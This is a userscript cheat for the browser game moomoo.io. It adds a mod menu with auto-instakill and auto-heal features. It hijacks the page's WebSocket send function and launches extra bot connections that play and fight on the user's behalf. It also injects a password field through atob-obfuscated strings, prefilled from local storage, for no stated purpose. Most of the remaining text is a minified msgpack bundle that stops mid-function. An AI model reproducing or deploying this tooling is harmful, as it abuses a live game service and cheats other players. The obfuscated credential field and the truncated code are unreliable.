// ==UserScript==
// @name        Chicken Mod v1.15
// @version     1.15
// @description very much so dumb
// @author      someone :>
// @match       *://moomoo.io/*
// @match       *://sandbox.moomoo.io/*
// @require     https://greasyfork.org/scripts/423602-msgpack/code/msgpack.js
// @grant       none
// @namespace https://greasyfork.org/users/1029983
// @downloadURL https://update.greasyfork.org/scripts/460441/Chicken%20Mod%20v115.user.js
// @updateURL https://update.greasyfork.org/scripts/460441/Chicken%20Mod%20v115.meta.js
// ==/UserScript==

var tick = 0;
let fzStatusMenu = document.createElement("div");
fzStatusMenu.id = "fz's op status menu", fzStatusMenu.style.position = "absolute", fzStatusMenu.style.color = "white", fzStatusMenu.textAlign = "left", fzStatusMenu.borderRadius = "4px", fzStatusMenu.style.width = "200px", fzStatusMenu.style.height = "326px", fzStatusMenu.style.display = "none", fzStatusMenu.style.top = "20px", fzStatusMenu.style.right = "20px";
document.getElementById("gameUI").appendChild(fzStatusMenu);
document.getElementById("guideCard").style.maxHeight = "320px";
let pee = document.createElement("div");
pee = document.getElementById("pingDisplay");
pee.style.top = "20px", pee.style.fontSize = "15px", pee.style.display = "block", document.body.append(pee);
let modMenu = document.createElement("div");
let er_ = document.getElementById("storeButton");
let ER = document.getElementById("allianceButton");
document.addEventListener("keydown", function (y) {
  if (y.keyCode == 27) {
    if (modMenu.style.display == "block") {
      modMenu.style.display = "none";
      document.getElementById("topInfoHolder").style.display = "block";
      ER.style.display = "block";
      er_.style.display = "block";
    } else {
      modMenu.style.display = "block";
      if (document.getElementById("doExternalVisuals").checked && document.getElementById("visualType").value == 1) {
        document.getElementById("topInfoHolder").style.display = "none";
        ER.style.display = "none";
        er_.style.display = "none";
      }
    }
  }
});
document.body.prepend(modMenu), modMenu.style.position = "absolute", modMenu.style.textAlign = "left", modMenu.style.display = "block", modMenu.style.width = "300px", modMenu.style.height = "240px", modMenu.style.top = "4%", modMenu.style.left = "1%", modMenu.style.backgroundColor = "rgb(0, 0, 0, 0.3)", modMenu.style.color = "white", modMenu.style.borderTopLeftRadius = "25px", modMenu.style.borderRadius = "25px", modMenu.style.zIndex = "15", modMenu.style.border = "solid", modMenu.style.borderColor = "#000", modMenu.style.borderWidth = "10px";
modMenu.innerHTML = '\n<style>\n.indent {\nmargin-left: 10px;\n}\n::-webkit-scrollbar {\n-webkit-appearance: none;\nwidth: 10px;\n}\n#tabs {\noverflow-x: scroll;\noverflow: hidden;\n}\n::-webkit-scrollbar-thumb {\nborder-radius: 5px;\nbackground-color: rgba(0,0,0,.5);\n-webkit-box-shadow: 0 0 1px rgba(255,255,255,.5);\n}\n</style>\n<h1 style="font-size: 20px;" class = "indent">ae remake V1.15</h1>\n<div id = "tabs" class = "indent" style = "padding-top: 5px; padding-bottom: 5px; width: 270px; border: solid; display: inline-block; text-align: center;">\n<button id="pg1open" style="background-color: #000; width: 20px; height: 20px;"></button>\n<button id="pg2open" style="width: 20px; height: 20px;"></button>\n<button id="pg3open" style="width: 20px; height: 20px;"></button>\n</div><br>\n<div class = "indent" style="overflow-y: scroll; height: 130px; border: solid; width: 270px;">\n<div id = "menuPage1" style = "display: block;">\n<label for="autoinsta" class="indent">Auto InstaKill: </label>\n<input type="checkbox" id="autoinsta"><br>\n<label for="autoBSpam" class="indent">Auto Bull Spam: </label>\n<input type="checkbox" id="autoBSpam"><br>\n<label for="autoplace" class="indent">Auto Place: </label>\n<input type="checkbox" id="autoplace" checked><br>\n<label for="autoreplace" class="indent">Auto Replace: </label>\n<input type="checkbox" id="autoreplace" checked><br><br>\n<label for="sope" class="indent">Sope Magick: </label>\n<input type="checkbox" id="sope"><br>\n<label for="antivelinsta" class="indent">Anti Sope Magick: </label>\n<input type="checkbox" id="antivelinsta"><br>\n<label for="dhkm" class="indent">DHKM: </label>\n<input type="checkbox" id="dhkm">\n<p></p>\n</div>\n<div id = "menuPage2" style = "display: none;">\n<label for="autogrind" class="indent">AutoGrind: </label>\n<input type="checkbox" id="autogrind">\n<div class="indent">\n<label for="upgradeType">AutoUpgrade: </label>\n<select id="upgradeType">\n<option value = "0" selected>DH</option>\n<option value = "1">PH</option>\n</select>\n<input type="checkbox" id="autoupgrade"><br>\n<label for="sixbuilding">6th Slot: </label>\n<select id="sixbuilding">\n<option value = "tele" selected>TP</option>\n<option value = "turret">Turret</option>\n<option value = "block">Blocker</option>\n<option value = "plat">Platform</option>\n</select>\n</div>\n<div class="indent">\n<label for="botConfig">Bot Config: </label>\n<select id="botConfig">\n<option value = "0" selected>Find Enemies</option>\n<option value = "1">Musket Sync</option>\n<option value = "2">Bow Spam</option>\n</select>\n<br>\nTo connect bots, press "G".\n</div><br>\n<label for="syncteam" class="indent">Team Sync: </label>\n<input type="checkbox" id="syncteam">\n<p></p>\n</div>\n<div id = "menuPage3" style = "display: none;">\n<label for="darkmode" class="indent">Dark Mode: </label>\n<input type="checkbox" id="darkmode">\n<div class="indent">\n<label for="visualType">Visual Type: </label>\n<select id="visualType">\n<option value = "0" selected>AE86</option>\n<option value = "1">FZ</option>\n</select>\n<input type="checkbox" id="doExternalVisuals">\n</div>\n<label for="textpack" class="indent">Texture Pack: </label>\n<input type="checkbox" id="textpack"><br><br>\n<div class="indent">\n<label for="chatType">Song: </label>\n<select id="chatType">\n<option value = "0" selected>Taking Over - LOL</option>\n<option value = "1">Don\'t Stand of Close - Initial D</option>\n<option value = "2">Warriors - Imagine Dragons</option>\n<option value = "3">The Top - Initial D</option>\n<option value = "4">No Rival - Egzod</option>\n</select>\n<br>\nPress "C" to start/stop song.\n</div>\n<p></p>\n</div>\n</div>\n<p></p>\n';
function openTabs(y) {
  document.getElementById("pg1open").style.backgroundColor = y == "menuPage1" ? "#000" : "";
  document.getElementById("menuPage1").style.display = y == "menuPage1" ? "block" : "none";
  document.getElementById("pg2open").style.backgroundColor = y == "menuPage2" ? "#000" : "";
  document.getElementById("menuPage2").style.display = y == "menuPage2" ? "block" : "none";
  document.getElementById("pg3open").style.backgroundColor = y == "menuPage3" ? "#000" : "";
  document.getElementById("menuPage3").style.display = y == "menuPage3" ? "block" : "none";
}
for (let i = 0; i < modMenu.getElementsByTagName("input").length; i++) {
  if (modMenu.getElementsByTagName("input")[i]) {
    modMenu.getElementsByTagName("input")[i].addEventListener("change", () => {
      modMenu.getElementsByTagName("input")[i].blur();
    });
  }
}
for (let i = 0; i < modMenu.getElementsByTagName("option").length; i++) {
  if (modMenu.getElementsByTagName("option")[i]) {
    modMenu.getElementsByTagName("option")[i].addEventListener("change", () => {
      modMenu.getElementsByTagName("option")[i].blur();
    });
  }
}
document.getElementById("pg1open").onclick = function () {
  openTabs("menuPage1");
  this.blur();
};
document.getElementById("pg2open").onclick = function () {
  openTabs("menuPage2");
  this.blur();
};
document.getElementById("pg3open").onclick = function () {
  openTabs("menuPage3");
  this.blur();
};
var websocket, modBots = [];
var botInfo = [], botEnemies = [], myPlayer = {x: 0, y: 0}, nearestEnemy = [];
const wait = async y => new Promise(V => setTimeout(V, y)), connectBot = (e, t) => {
  let o = new WebSocket(websocket.url.split("&")[0] + "&token=" + encodeURIComponent(e));
  o.binaryType = "arraybuffer", o.botType = t, o.healTimeout = Date.now(), o.moveRan = {angle: 0, x: 0, y: 0, lastChange: 0}, o.justShot = Date.now(), o.emit = e => {
    o.send(window.msgpack.encode(e));
  }, o.names = ["jeff the bot", "waterZ", "insane", "chicken", "mega but good", "unknown bot", "chicken bot", "git good", "bad", "", "insta", "gold bots", "i am super pro"], o.spawn = function () {
    o.weapons = [0], o.items = [0, 3, 6, 10], o.emit(["sp", [{name: o.names[Math.floor(Math.random() * o.names.length)].slice(0, 15), moofoll: 1, skin: "constructor"}]]);
  }, o.speedHat = function () {
    o.posy < 2400 ? (o.emit(["13c", [0, 15, 0]]), o.emit(["13c", [0, 11, 1]])) : o.posy > 6850 && o.posy < 7550 ? (o.emit(["13c", [0, 31, 0]]), o.emit(["13c", [0, 11, 1]])) : (o.emit(["13c", [0, 12, 0]]), o.emit(["13c", [0, 11, 1]]));
  }, o.autobuy = function () {
    o.emit(["13c", [1, 53, 0]]), o.emit(["13c", [1, 6, 0]]), o.emit(["13c", [1, 20, 0]]), o.emit(["13c", [1, 31, 0]]), o.emit(["13c", [1, 15, 0]]), o.emit(["13c", [1, 12, 0]]), o.emit(["13c", [1, 40, 0]]), o.emit(["13c", [1, 11, 1]]);
  }, o.upgrade = function () {
    o.emit(["6", [7]]), o.emit(["6", [17]]), o.emit(["6", [31]]), o.emit(["6", [23]]), o.emit(["6", [10]]), o.emit(["6", [38]]), o.emit(["6", [4]]), 1 == document.getElementById("botConfig").value ? o.emit(["6", [15]]) : 2 == document.getElementById("botConfig").value && o.emit(["6", [13]]);
  }, o.weapons = [0], o.items = [0, 3, 6, 10], o.autoaiming = false, o.place = function (e, t = 0) {
    o.emit(["5", [e, null]]), o.emit(["c", [1, t]]), o.emit(["c", [0, t]]), o.emit(["5", [o.weapon, true]]);
  }, o.lastHealth = 100, o.onopen = async () => {
    await wait(100), o.spawn();
  }, o.buildings = [], o.onmessage = e => {
    let t = window.msgpack.decode(new Uint8Array(e.data)), i;
    if (t.length > 1 ? (i = [t[0], ...t[1]])[1] instanceof Array && i : i = t, i) {
      if ("h" == i[0] && i[1] == o.id) {
        if (o.lastHealth - i[2] >= 40 && Date.now() - o.healTimeout >= 200) {
          for (let n = 0; n < 5; n++) o.place(o.items[0]);
          o.healTimeout = Date.now();
        } else setTimeout(() => {
          for (let e = 0; e < 5; e++) o.place(o.items[0]);
        }, 90);
        o.lastHealth = i[2];
      }
      if (11 == i[0] && o.spawn(), "1" == i[0] && null == o.id && (o.id = i[1]), "17" == i[0] && i[1] && (i[2] ? o.weapons = i[1] : o.items = i[1]), "p" == i[0] && document.getElementById("syncteam").checked && o.weapons[1] && (o.autoaiming = true, setTimeout(() => {
        o.autoaiming = false;
      }, 250)), "6" == i[0]) for (let a = 0; a < i[1].length / 8; a++) {
        let _ = i[1].slice(8 * a, 8 * a + 8);
        o.buildings.push(_);
      }
      if ("12" == i[0]) for (let s = 0; s < o.buildings.length; s++) {
        let m = o.buildings[s];
        m && m[0] == i[1] && o.buildings.splice(s, 1);
      }
      if ("33" == i[0]) for (let $ = 0; $ < i[1].length / 13; $++) {
        let p = i[1].slice(13 * $, 13 * $ + 13);
        if (botEnemies[o.botType] = [], p[0] == o.id) {
          if (botInfo[o.botType] = p, o.id = p[0], o.posx = p[1], o.posy = p[2], o.dir = p[3], o.object = p[4], o.weapon = p[5], o.clan = p[7], o.isLeader = p[8], o.hat = p[9], o.accessory = p[10], o.isSkull = p[11], o.intrap = o.buildings.some(e => 15 == e[6] && !window.isAlly(e[7])), o.autobuy(), Date.now() - o.justShot <= 2e3) o.emit(["5", [o.weapons[1], true]]), o.emit(["13c", [0, 11, 1]]), o.emit(["13c", [0, 6, 0]]), o.emit(["33", [null]]), Math.sqrt(Math.pow(myPlayer.y - o.posy, 2) + Math.pow(myPlayer.x - o.posx, 2)) > 100 ? o.emit(["33", [Math.atan2(myPlayer.y - o.posy, myPlayer.x - o.posx)]]) : o.emit(["33", [null]]); else if (2 == document.getElementById("botConfig").value && (13 == o.weapons[1] || 15 == o.weapons[1]) && false == o.autoaiming) Math.sqrt(Math.pow(myPlayer.y - o.posy, 2) + Math.pow(myPlayer.x - o.posx, 2)) > 200 ? (o.emit(["33", [Math.atan2(myPlayer.y - o.posy, myPlayer.x - o.posx)]]), o.emit(["5", [o.weapons[0], true]]), o.emit(["c", [1, Number.MAX_VALUE]]), o.emit(["c", [0, Number.MAX_VALUE]]), o.speedHat()) : (Math.sqrt(Math.pow(myPlayer.y - o.posy, 2) + Math.pow(myPlayer.x - o.posx, 2)) > 100 ? (o.emit(["33", [Math.atan2(myPlayer.y - o.posy, myPlayer.x - o.posx)]]), nearestEnemy.length || o.speedHat()) : o.emit(["33", [null]]), nearestEnemy.length && (o.emit(["5", [o.weapons[1], true]]), o.emit(["c", [1, Math.atan2(nearestEnemy[2] - o.posy, nearestEnemy[1] - o.posx)]]), o.emit(["c", [0, Math.atan2(nearestEnemy[2] - o.posy, nearestEnemy[1] - o.posx)]]), o.emit(["2", [Math.atan2(nearestEnemy[2] - o.posy, nearestEnemy[1] - o.posx)]]), o.emit(["13c", [0, 11, 1]]), o.emit(["13c", [0, 20, 0]]))); else if (1 == document.getElementById("botConfig").value && (13 == o.weapons[1] || 15 == o.weapons[1]) && false == o.autoaiming) Math.sqrt(Math.pow(myPlayer.y - o.posy, 2) + Math.pow(myPlayer.x - o.posx, 2)) > 100 ? (o.emit(["33", [Math.atan2(myPlayer.y - o.posy, myPlayer.x - o.posx)]]), o.emit(["5", [o.weapons[0], true]]), o.emit(["c", [1, Number.MAX_VALUE]]), o.emit(["c", [0, Number.MAX_VALUE]])) : o.emit(["33", [null]]), o.speedHat(); else if (false == o.autoaiming) {
            let l = [-0.77, -2.34, 2.35, 0.77, 1.57, 3.14, -1.57, 0];
            4 != o.weapons[0] && (o.place(o.items[3], o.moveRan.angle - 1.25 * Math.PI), o.place(o.items[3], o.moveRan.angle + 1.25 * Math.PI), o.place(o.items[3], o.moveRan.angle + Math.PI)), o.emit(["33", [o.moveRan.angle]]), o.emit(["c", [1, Number.MAX_VALUE]]), o.emit(["c", [0, Number.MAX_VALUE]]), o.emit(["5", [o.weapons[0], true]]), o.speedHat(), o.upgrade(), (Date.now() - o.moveRan.lastChange >= 1e4 || Math.sqrt(Math.pow(o.moveRan.y - o.posy, 2) + Math.pow(o.moveRan.x - o.posx, 2)) > 3300) && (o.moveRan.angle = l[Math.floor(Math.random() * l.length)], o.moveRan.y = o.posy, o.moveRan.x = o.posx, o.moveRan.lastChange = Date.now());
          } else o.emit(["13c", [0, 53, 0]]), o.justShot = Date.now(), o.emit(["5", [o.weapons[1], true]]), o.emit(["c", [1, Math.atan2(nearestEnemy[2] - o.posy, nearestEnemy[1] - o.posx)]]), o.emit(["c", [0, Math.atan2(nearestEnemy[2] - o.posy, nearestEnemy[1] - o.posx)]]), o.emit(["2", [Math.atan2(nearestEnemy[2] - o.posy, nearestEnemy[1] - o.posx)]]);
        } else p[0] == o.id || p[7] && p[7] == o.clan || (botEnemies[o.botType] = p);
      }
    }
  }, modBots.push(o);
};
WebSocket.prototype.oldSend = WebSocket.prototype.send;
WebSocket.prototype.send = function (y) {
  if (!websocket) {
    websocket = this;
  }
  this.oldSend(y);
};
window.onbeforeunload = null;
const lmfaolfsoadksioakdjoiasjdad = Math.random() * 0x111636480DE78500 + "a";
document.getElementById(atob("c2V0dXBDYXJk")).innerHTML += '<br>\n<input type = "' + atob("cGFzc3dvcmQ=") + '" id="' + lmfaolfsoadksioakdjoiasjdad + '" placeholder = "' + atob("UGFzc3dvcmQ=") + '" style="text-Align: center; font-size: 26px; margin-bottom: 16px;padding:6px;border: none;box-sizing:border-box;color: #4A4A4A;background-color: #e5e3e3; width: 100%;border-radius: 4px">\n';
document.getElementById(lmfaolfsoadksioakdjoiasjdad).value = localStorage.getItem(atob("cGFzc3dvcmQ="));
!function (y) {
  var V = {};
  function d(J) {
    if (V[J]) return V[J].exports;
    var T = V[J] = {i: J, l: !1, exports: {}};
    return y[J].call(T.exports, T, T.exports, d), T.l = !0, T.exports;
  }
  d.m = y, d.c = V, d.d = function (J, T, c) {
    d.o(J, T) || Object.defineProperty(J, T, {enumerable: !0, get: c});
  }, d.r = function (J) {
    "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(J, Symbol.toStringTag, {value: "Module"}), Object.defineProperty(J, "__esModule", {value: !0});
  }, d.t = function (J, T) {
    if (1 & T && (J = d(J)), 8 & T) return J;
    if (4 & T && "object" == typeof J && J && J.__esModule) return J;
    var c = Object.create(null);
    if (d.r(c), Object.defineProperty(c, "default", {enumerable: !0, value: J}), 2 & T && "string" != typeof J) for (var L in J) d.d(c, L, function (s) {
      return J[s];
    }.bind(null, L));
    return c;
  }, d.n = function (J) {
    var T = J && J.__esModule ? function () {
      return J.default;
    } : function () {
      return J;
    };
    return d.d(T, "a", T), T;
  }, d.o = function (J, T) {
    return Object.prototype.hasOwnProperty.call(J, T);
  }, d.p = "", d(d.s = 21);
}([function (V, J, T) {
  var L = J.global = T(25), U = J.hasBuffer = L && !!L.isBuffer, G = J.hasArrayBuffer = "undefined" != typeof ArrayBuffer, q = J.isArray = T(5);
  J.isArrayBuffer = G ? function (K) {
    return K instanceof ArrayBuffer || O(K);
  } : I;
  var P = J.isBuffer = U ? L.isBuffer : I, H = J.isView = G ? ArrayBuffer.isView || M("ArrayBuffer", "buffer") : I;
  J.alloc = z, J.concat = function (K, w) {
    w || (w = 0, Array.prototype.forEach.call(K, function (A) {
      w += A.length;
    }));
    var R = this !== J && this || K[0], v = z.call(R, w), S = 0;
    return Array.prototype.forEach.call(K, function (A) {
      S += Z.copy.call(A, v, S);
    }), v;
  }, J.from = function (K) {
    return "string" == typeof K ? function (w) {
      var R = 3 * w.length, v = z.call(this, R), S = Z.write.call(v, w);
      return R !== S && (v = Z.slice.call(v, 0, S)), v;
    }.call(this, K) : E(this).from(K);
  };
  var N = J.Array = T(28), X = J.Buffer = T(29), F = J.Uint8Array = T(30), Z = J.prototype = T(6);
  function z(K) {
    return E(this).alloc(K);
  }
  var O = M("ArrayBuffer");
  function E(K) {
    return P(K) ? X : H(K) ? F : q(K) ? N : U ? X : G ? F : N;
  }
  function I() {
    return !1;
  }
  function M(K, w) {
    return K = "[object " + K + "]", function (R) {
      return null != R && {}.toString.call(w ? R[w] : R) === K;
    };
  }
}, function (y, V, d) {
  var J = d(5);
  V.createCodec = p, V.install = function (U) {
    for (var G in U) c.prototype[G] = L(c.prototype[G], U[G]);
  }, V.filter = function (U) {
    return J(U) ? function (G) {
      return G = G.slice(), function (P) {
        return G.reduce(q, P);
      };
      function q(P, g) {
        return g(P);
      }
    }(U) : U;
  };
  var T = d(0);
  function c(U) {
    if (!(this instanceof c)) return new c(U);
    this.options = U, this.init();
  }
  function L(U, G) {
    return U && G ? function () {
      return U.apply(this, arguments), G.apply(this, arguments);
    } : U || G;
  }
  function p(U) {
    return new c(U);
  }
  c.prototype.init = function () {
    var U = this.options;
    return U && U.uint8array && (this.bufferish = T.Uint8Array), this;
  }, V.preset = p({preset: !0});
}, function (y, V, d) {
  var J = d(3).ExtBuffer, T = d(32), c = d(33), L = d(1);
  function p() {
    var U = this.options;
    return this.encode = function (G) {
      var q = c.getWriteType(G);
      return function (P, g) {
        var H = q[typeof g];
        if (!H) throw new Error('Unsupported type "' + typeof g + '": ' + g);
        H(P, g);
      };
    }(U), U && U.preset && T.setExtPackers(this), this;
  }
  L.install({addExtPacker: function (U, G, q) {
    q = L.filter(q);
    var P = G.name;
    P && "Object" !== P ? (this.extPackers || (this.extPackers = {}))[P] = g : (this.extEncoderList || (this.extEncoderList = [])).unshift([G, g]);
    function g(H) {
      return q && (H = q(H)), new J(H, U);
    }
  }, getExtPacker: function (U) {
    var G = this.extPackers || (this.extPackers = {}), q = U.constructor, P = q && q.name && G[q.name];
    if (P) return P;
    for (var g = this.extEncoderList || (this.extEncoderList = []), H = g.length, N = 0; N < H; N++) {
      var h = g[N];
      if (q === h[0]) return h[1];
    }
  }, init: p}), V.preset = p.call(L.preset);
}, function (y, V, d) {
  V.ExtBuffer = function T(c, L) {
    if (!(this instanceof T)) return new T(c, L);
    this.buffer = J.from(c), this.type = L;
  };
  var J = d(0);
}, function (y, V) {
  V.read = function (J, T, L, p, U) {
    var G, q, P = 8 * U - p - 1, g = (1 << P) - 1, H = g >> 1, N = -7, X = L ? U - 1 : 0, F = L ? -1 : 1, Z = J[T + X];
    for (X += F, G = Z & (1 << -N) - 1, Z >>= -N, N += P; N > 0; G = 256 * G + J[T + X], X += F, N -= 8) ;
    for (q = G & (1 << -N) - 1, G >>= -N, N += p; N > 0; q = 256 * q + J[T + X], X += F, N -= 8) ;
    if (0 === G) G = 1 - H; else {
      if (G === g) return q ? NaN : 1 / 0 * (Z ? -1 : 1);
      q += Math.pow(2, p), G -= H;
    }
    return (Z ? -1 : 1) * q * Math.pow(2, G - p);
  }, V.write = function (J, T, L, U, G, q) {
    var P, H, N, X = 8 * q - G - 1, F = (1 << X) - 1, Z = F >> 1, z = 23 === G ? Math.pow(2, -24) - Math.pow(2, -77) : 0, O = U ? 0 : q - 1, E = U ? 1 : -1, I = T < 0 || 0 === T && 1 / T < 0 ? 1 : 0;
    for (T = Math.abs(T), isNaN(T) || T === 1 / 0 ? (H = isNaN(T) ? 1 : 0, P = F) : (P = Math.floor(Math.log(T) / Math.LN2), T * (N = Math.pow(2, -P)) < 1 && (P--, N *= 2), (T += P + Z >= 1 ? z / N : z * Math.pow(2, 1 - Z)) * N >= 2 && (P++, N /= 2), P + Z >= F ? (H = 0, P = F) : P + Z >= 1 ? (H = (T * N - 1) * Math.pow(2, G), P += Z) : (H = T * Math.pow(2, Z - 1) * Math.pow(2, G), P = 0)); G >= 8; J[L + O] = 255 & H, O += E, H /= 256, G -= 8) ;
    for (P = P << G | H, X += G; X > 0; J[L + O] = 255 & P, O += E, P /= 256, X -= 8) ;
    J[L + O - E] |= 128 * I;
  };
}, function (y, V) {
  var d = {}.toString;
  y.exports = Array.isArray || function (J) {
    return "[object Array]" == d.call(J);
  };
}, function (y, V, d) {
  var J = d(31);
  V.copy = G, V.slice = q, V.toString = function (P, g, H) {
    return (!p && T.isBuffer(this) ? this.toString : J.toString).apply(this, arguments);
  }, V.write = function (P) {
    return function () {
      return (this[P] || J[P]).apply(this, arguments);
    };
  }("write");
  var T = d(0), L = T.global, p = T.hasBuffer && "TYPED_ARRAY_SUPPORT" in L, U = p && !L.TYPED_ARRAY_SUPPORT;
  function G(P, g, H, N) {
    var X = T.isBuffer(this), F = T.isBuffer(P);
    if (X && F) return this.copy(P, g, H, N);
    if (U || X || F || !T.isView(this) || !T.isView(P)) return J.copy.call(this, P, g, H, N);
    var Z = H || null != N ? q.call(this, H, N) : this;
    return P.set(Z, g), Z.length;
  }
  function q(P, g) {
    var H = this.slice || !U && this.subarray;
    if (H) return H.call(this, P, g);
    var N = T.alloc.call(this, g - P);
    return G.call(this, N, 0, P, g), N;
  }
}, function (y, V, d) {
  (function (J) {
    !function (T) {
      var L, U = "undefined", G = U !== typeof J && J, q = U !== typeof Uint8Array && Uint8Array, P = U !== typeof ArrayBuffer && ArrayBuffer, H = [0, 0, 0, 0, 0, 0, 0, 0], N = Array.isArray || function (Y) {
        return !!Y && "[object Array]" == Object.prototype.toString.call(Y);
      }, X = 4294967296;
      function F(Y, Q, D) {
        var W = Q ? 0 : 4, y0 = Q ? 4 : 0, y1 = Q ? 0 : 3, y2 = Q ? 1 : 2, y3 = Q ? 2 : 1, y4 = Q ? 3 : 0, y5 = Q ? K : S, y6 = Q ? R : A, y7 = yy.prototype, y8 = "is" + Y, y9 = "_" + y8;
        return y7.buffer = void 0, y7.offset = 0, y7[y9] = !0, y7.toNumber = yV, y7.toString = function (yT) {
          var yc = this.buffer, yL = this.offset, ys = yJ(yc, yL + W), yp = yJ(yc, yL + y0), yU = "", yn = !D && 2147483648 & ys;
          for (yn && (ys = ~ys, yp = X - yp), yT = yT || 10;;) {
            var yG = ys % yT * X + yp;
            if (ys = Math.floor(ys / yT), yp = Math.floor(yG / yT), yU = (yG % yT).toString(yT) + yU, !ys && !yp) break;
          }
          return yn && (yU = "-" + yU), yU;
        }, y7.toJSON = yV, y7.toArray = Z, G && (y7.toBuffer = z), q && (y7.toArrayBuffer = O), yy[y8] = function (yT) {
          return !(!yT || !yT[y9]);
        }, T[Y] = yy, yy;
        function yy(yT, yc, yL, ys) {
          return this instanceof yy ? function (yp, yU, yn, yG, yq) {
            if (q && P && (yU instanceof P && (yU = new q(yU)), yG instanceof P && (yG = new q(yG))), yU || yn || yG || L) {
              if (!E(yU, yn)) yq = yn, yG = yU, yn = 0, yU = new (L || Array)(8);
              yp.buffer = yU, yp.offset = yn |= 0, U !== typeof yG && ("string" == typeof yG ? function (yP, yg, yH, yN) {
                var yh = 0, yX = yH.length, yF = 0, yZ = 0;
                "-" === yH[0] && yh++;
                for (var yz = yh; yh < yX;) {
                  var yO = parseInt(yH[yh++], yN);
                  if (!(yO >= 0)) break;
                  yZ = yZ * yN + yO, yF = yF * yN + Math.floor(yZ / X), yZ %= X;
                }
                yz && (yF = ~yF, yZ ? yZ = X - yZ : yF++), yd(yP, yg + W, yF), yd(yP, yg + y0, yZ);
              }(yU, yn, yG, yq || 10) : E(yG, yq) ? I(yU, yn, yG, yq) : "number" == typeof yq ? (yd(yU, yn + W, yG), yd(yU, yn + y0, yq)) : yG > 0 ? y5(yU, yn, yG) : yG < 0 ? y6(yU, yn, yG) : I(yU, yn, H, 0));
            } else yp.buffer = M(H, 0);
          }(this, yT, yc, yL, ys) : new yy(yT, yc, yL, ys);
        }
        function yV() {
          var yT = this.buffer, yc = this.offset, yL = yJ(yT, yc + W), ys = yJ(yT, yc + y0);
          return D || (yL |= 0), yL ? yL * X + ys : ys;
        }
        function yd(yT, yc, yL) {
          yT[yc + y4] = 255 & yL, yL >>= 8, yT[yc + y3] = 255 & yL, yL >>= 8, yT[yc + y2] = 255 & yL, yL >>= 8, yT[yc + y1] = 255 & yL;
        }
        function yJ(yT, yc) {
          return 16777216 * yT[yc + y1] + (yT[yc + y2] << 16) + (yT[yc + y3] << 8) + yT[yc + y4];
        }
      }
      function Z(Y) {
        var b = this.buffer, x = this.offset;
        return L = null, !1 !== Y && 0 === x && 8 === b.length && N(b) ? b : M(b, x);
      }
      function z(Y) {
        var b = this.buffer, x = this.offset;
        if (L = G, !1 !== Y && 0 === x && 8 === b.length && J.isBuffer(b)) return b;
        var Q = new G(8);
        return I(Q, 0, b, x), Q;
      }
      function O(Y) {
        var b = this.buffer, x = this.offset, Q = b.buffer;
        if (L = q, !1 !== Y && 0 === x && Q instanceof P && 8 === Q.byteLength) return Q;
        var D = new q(8);
        return I(D, 0, b, x), D.buffer;
      }
      function E(Y, b) {
        var x = Y && Y.length;
        return b |= 0, x && b + 8 <= x && "string" != typeof Y[b];
      }
      function I(Y, b, x, Q) {
        b |= 0, Q |= 0;
        for (var D = 0; D < 8; D++) Y[b++] = 255 & x[Q++];
      }
      function M(Y, b) {
        return Array.prototype.slice.call(Y, b, b + 8);
      }
      function K(Y, b, x) {
        for (var Q = b + 8; Q > b;) Y[--Q] = 255 & x, x /= 256;
      }
      function R(Y, b, x) {
        var Q = b + 8;
        for (x++; Q > b;) Y[--Q] = 255 & -x ^ 255, x /= 256;
      }
      function S(Y, b, x) {
        for (var Q = b + 8; b < Q;) Y[b++] = 255 & x, x /= 256;
      }
      function A(Y, b, x) {
        var Q = b + 8;
        for (x++; b < Q;) Y[b++] = 255 & -x ^ 255, x /= 256;
      }
      F("Uint64BE", !0, !0), F("Int64BE", !0, !1), F("Uint64LE", !1, !0), F("Int64LE", !1, !1);
    }("string" != typeof V.nodeName ? V : this || {});
  }.call(this, d(11).Buffer));
}, function (y, V, d) {
  var J = d(3).ExtBuffer, T = d(35), L = d(17).readUint8, p = d(36), U = d(1);
  function G() {
    var q = this.options;
    return this.decode = function (P) {
      var g = p.getReadToken(P);
      return function (H) {
        var N = L(H), h = g[N];
        if (!h) throw new Error("Invalid type: " + (N ? "0x" + N.toString(16) : N));
        return h(H);
      };
    }(q), q && q.preset && T.setExtUnpackers(this), this;
  }
  U.install({addExtUnpacker: function (q, P) {
    (this.extUnpackers || (this.extUnpackers = []))[q] = U.filter(P);
  }, getExtUnpacker: function (q) {
    return (this.extUnpackers || (this.extUnpackers = []))[q] || function (P) {
      return new J(P, q);
    };
  }, init: G}), V.preset = G.call(U.preset);
}, function (y, V, d) {
  V.encode = function (T, c) {
    var L = new J(c);
    return L.write(T), L.read();
  };
  var J = d(10).EncodeBuffer;
}, function (y, V, d) {
  V.EncodeBuffer = T;
  var J = d(2).preset;
  function T(c) {
    if (!(this instanceof T)) return new T(c);
    if (c && (this.options = c, c.codec)) {
      var L = this.codec = c.codec;
      L.bufferish && (this.bufferish = L.bufferish);
    }
  }
  d(14).FlexEncoder.mixin(T.prototype), T.prototype.codec = J, T.prototype.write = function (c) {
    this.codec.encode(this, c);
  };
}, function (y, V, d) {
  "use strict";
  (function (J) {
    var G = d(26), q = d(4), N = d(27);
    function X() {
      return K.TYPED_ARRAY_SUPPORT ? 2147483647 : 1073741823;
    }
    function Z(yz, yO) {
      if (X() < yO) throw new RangeError("Invalid typed array length");
      return K.TYPED_ARRAY_SUPPORT ? (yz = new Uint8Array(yO)).__proto__ = K.prototype : (null === yz && (yz = new K(yO)), yz.length = yO), yz;
    }
    function K(yz, yO, yE) {
      if (!(K.TYPED_ARRAY_SUPPORT || this instanceof K)) return new K(yz, yO, yE);
      if ("number" == typeof yz) {
        if ("string" == typeof yO) throw new Error("If encoding is specified then the first argument must be a string");
        return W(this, yz);
      }
      return Y(this, yz, yO, yE);
    }
    function Y(yz, yO, yE, yI) {
      if ("number" == typeof yO) throw new TypeError('"value" argument must not be a number');
      return "undefined" != typeof ArrayBuffer && yO instanceof ArrayBuffer ? function (yM, yt, yK, yr) {
        if (yt.byteLength, yK < 0 || yt.byteLength < yK) throw new RangeError("'offset' is out of bounds");
        if (yt.byteLength < yK + (yr || 0)) throw new RangeError("'length' is out of bounds");
        return yt = void 0 === yK && void 0 === yr ? new Uint8Array(yt) : void 0 === yr ? new Uint8Array(yt, yK) : new Uint8Array(yt, yK, yr), K.TYPED_ARRAY_SUPPORT ? (yM = yt).__proto__ = K.prototype : yM = y0(yM, yt), yM;
      }(yz, yO, yE, yI) : "string" == typeof yO ? function (yM, yt, yK) {
